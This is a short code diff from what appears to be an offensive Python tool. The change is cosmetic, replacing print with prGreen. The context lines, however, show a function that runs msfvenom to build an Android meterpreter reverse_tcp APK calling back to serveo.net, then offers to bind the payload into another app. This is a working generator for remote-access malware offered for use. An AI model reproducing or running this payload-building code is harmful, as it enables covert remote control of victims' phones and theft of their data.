@@ -169,7 +169,7 @@ def generateandroidpayload():
     x = input("Please enter The Port Number To be Used or enter a random number b/w 1024-65535: ")
     print("Payload is generating please be patient [*]")
     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=" + x + " -o $HOME/downloads/androidpayload.apk")
-    print ("The bare payload has been saved as $HOME/downloads/androidpayload.apk")
+    prGreen ("The bare payload has been saved as $HOME/downloads/androidpayload.apk")
     print ('''Choose additional options... (choosing any option 1,2,3 will cause the payload to regenerate.
            No additional user input is needed.)
            [1] Bind payload
